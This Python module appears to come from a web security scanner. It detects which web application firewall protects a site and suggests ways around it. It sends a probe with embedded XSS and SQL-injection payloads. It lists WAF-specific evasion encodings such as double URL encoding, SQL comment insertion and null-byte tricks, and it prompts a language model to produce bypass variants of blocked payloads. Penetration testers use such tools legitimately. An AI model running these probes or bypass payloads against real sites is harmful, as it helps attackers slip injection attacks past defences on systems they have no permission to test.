"""
WAF Auto-Detection and Bypass Strategy (A-2)
Detects WAF presence from HTTP response headers and body patterns,
then suggests WAF-specific bypass encodings via LLM or built-in rules.
"""
import re
from typing import Optional

import httpx


# ---------------------------------------------------------------------------
# WAF fingerprints
# ---------------------------------------------------------------------------

_WAF_SIGNATURES: list[tuple[str, str, str]] = [
    # (name, header_pattern, body_pattern)  — empty string = not checked
    ("Cloudflare",       r"cf-ray|cloudflare",              r"cloudflare"),
    ("AWS WAF",          r"x-amzn-requestid|x-amz-cf-id",   r"aws|request blocked"),
    ("Akamai",           r"akamai|x-check-cacheable",        r"access denied.*akamai"),
    ("Imperva/Incapsula",r"x-iinfo|incap_ses",               r"incapsula incident"),
    ("Sucuri",           r"x-sucuri-id|x-sucuri-cache",      r"sucuri website firewall"),
    ("ModSecurity",      r"",                                 r"mod_security|modsecurity|naxsi"),
    ("F5 BIG-IP ASM",    r"x-wa-info|bigip",                 r"the requested url was rejected"),
    ("Barracuda",        r"barra_counter_session",            r"barracuda networks"),
    ("DenyAll",          r"sessioncookie=",                   r"denyall"),
    ("FortiWeb",         r"fortiwafsid=",                     r"fortiweb"),
    ("Wallarm",          r"x-wallarm-",                       r"wallarm"),
    ("Wordfence",        r"",                                 r"wordfence"),
    ("Generic WAF",      r"",                                 r"web application firewall|access denied|blocked by"),
]

# WAF-specific bypass strategies: WAF name → list of bypass hints
_WAF_BYPASSES: dict[str, list[str]] = {
    "Cloudflare": [
        "Double URL encode: %253Cscript%253E",
        "Unicode normalization: \\u003cscript\\u003e",
        "HTML entity bypass: &#x3C;script&#x3E;",
        "Case mutation: <ScRiPt>alert(1)</sCrIpT>",
        "Newline injection: <scr\nipt>alert(1)</scr\nipt>",
    ],
    "AWS WAF": [
        "Double encoding: %2527 for single quote",
        "Null byte insertion: payload%00suffix",
        "Parameter pollution: ?q=safe&q=<xss>",
        "Chunked transfer encoding tricks",
        "JSON body with Unicode escapes: \\u0022 for quotes",
    ],
    "ModSecurity": [
        "Comment insertion: un/**/ion sel/**/ect",
        "Case variation: SeLeCt 1,2,3",
        "Hex encoding: 0x53454c454354",
        "URL encoding mix: %u0053ELECT",
        "Operator substitution: 1 LIKE 1 instead of 1=1",
    ],
    "Generic WAF": [
        "URL encoding: %3Cscript%3E",
        "Double URL encoding: %253Cscript%253E",
        "HTML entity encoding: &lt;script&gt;",
        "Case variation: <ScRiPt>",
        "Whitespace substitution: tab/newline instead of space",
        "Comment insertion: SELECT/**/1",
    ],
}


class WAFDetector:
    """Detects WAF presence and suggests bypass strategies."""

    def __init__(self, payload_gen=None):
        self.payload_gen = payload_gen
        self._detected: Optional[str] = None
        self._checked: bool = False

    async def detect(self, url: str, timeout: float = 10.0) -> Optional[str]:
        """
        Probe the target URL and detect WAF type.
        Returns the detected WAF name or None.
        """
        if self._checked:
            return self._detected
        self._checked = True

        try:
            async with httpx.AsyncClient(
                timeout=timeout,
                verify=False,
                follow_redirects=True,
            ) as client:
                # First: normal request
                resp = await client.get(url)
                normal_headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
                normal_body = resp.text[:5000].lower()

                # Second: obviously malicious request to trigger WAF
                probe_url = url + "?test=<script>alert(1)</script>&id=1' OR '1'='1"
                resp2 = await client.get(probe_url)
                waf_headers = {k.lower(): v.lower() for k, v in resp2.headers.items()}
                waf_body = resp2.text[:5000].lower()
        except Exception:
            return None

        # Check for WAF signatures in the triggered response
        for name, header_pat, body_pat in _WAF_SIGNATURES:
            header_str = " ".join(f"{k}: {v}" for k, v in waf_headers.items())
            if header_pat and re.search(header_pat, header_str, re.IGNORECASE):
                self._detected = name
                return name
            if body_pat and re.search(body_pat, waf_body, re.IGNORECASE):
                self._detected = name
                return name

        # Check normal response headers too (some WAFs add headers always)
        for name, header_pat, body_pat in _WAF_SIGNATURES:
            if not header_pat:
                continue
            header_str = " ".join(f"{k}: {v}" for k, v in normal_headers.items())
            if re.search(header_pat, header_str, re.IGNORECASE):
                self._detected = name
                return name

        return None

    def get_bypass_hints(self, waf_name: Optional[str] = None) -> list[str]:
        """Return bypass strategy hints for the detected (or specified) WAF."""
        name = waf_name or self._detected or "Generic WAF"
        return _WAF_BYPASSES.get(name, _WAF_BYPASSES["Generic WAF"])

    async def get_bypass_payloads_llm(
        self,
        waf_name: str,
        check_type: str,
        original_payload: str,
    ) -> list[str]:
        """
        Ask the LLM for WAF-specific bypass payloads for a given check type.
        Falls back to built-in hints on error.
        """
        if not self.payload_gen:
            return []
        hints = "\n".join(f"- {h}" for h in self.get_bypass_hints(waf_name))
        prompt = (
            f"A {waf_name} WAF is blocking {check_type} payloads. "
            f"Known bypass strategies for this WAF:\n{hints}\n\n"
            f"The original payload that was blocked: {original_payload}\n\n"
            f"Generate 5 WAF-bypass variants of this payload using the strategies above. "
            f"Return ONLY a JSON array of strings."
        )
        try:
            result = await self.payload_gen._call_llm(prompt)
            return result or []
        except Exception:
            return []

    def summary(self) -> str:
        if self._detected:
            return f"WAF detected: {self._detected}"
        return "No WAF detected"
